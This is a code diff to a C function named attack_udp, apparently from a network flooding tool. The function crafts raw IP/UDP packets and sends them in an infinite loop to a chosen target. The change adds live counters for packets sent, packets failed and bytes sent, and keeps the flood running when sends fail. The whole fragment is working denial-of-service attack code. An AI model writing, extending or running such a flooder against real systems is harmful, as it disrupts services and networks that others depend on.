@@ -17,6 +17,7 @@ void attack_udp(struct target_data *target)
 	struct ip_hdr *iph = (struct ip_hdr *)buffer;
 	struct udp_hdr *udph = (struct udp_hdr *)(buffer + sizeof(struct ip_hdr));
 	struct sockaddr_in target_addr;
+	struct attack_info info;
 
 	seed_rand(time(NULL));
 
@@ -24,6 +25,9 @@ void attack_udp(struct target_data *target)
 	target_addr.sin_port = target->port == 0 ? 0 : htons(target->port);
 	target_addr.sin_addr.s_addr = target->address;
 	target->sockfd = init_socket(IPPROTO_UDP);
+
+	init_attack_info(target, &info);
+	print_attack_header(&info);
 
 	while (1) {
 		build_ip(iph, sizeof(struct ip_hdr) + sizeof(struct tcp_hdr),
@@ -33,9 +37,11 @@ void attack_udp(struct target_data *target)
 		if (sendto(target->sockfd, buffer, iph->length, 0,
 				(struct sockaddr *)&target_addr,
 				sizeof(struct sockaddr_in)) == -1) {
-			fprintf(stderr, "%serror while sending packet : %s\n%s",
-				COLOR_RED, strerror(errno), COLOR_RESET);
-			exit(EXIT_FAILURE);
+			info.packets_fail++;
+		} else {
+			info.packets_send++;
+			info.total_size += iph->length;
 		}
+		print_attack_info(&info);
 	}
 }
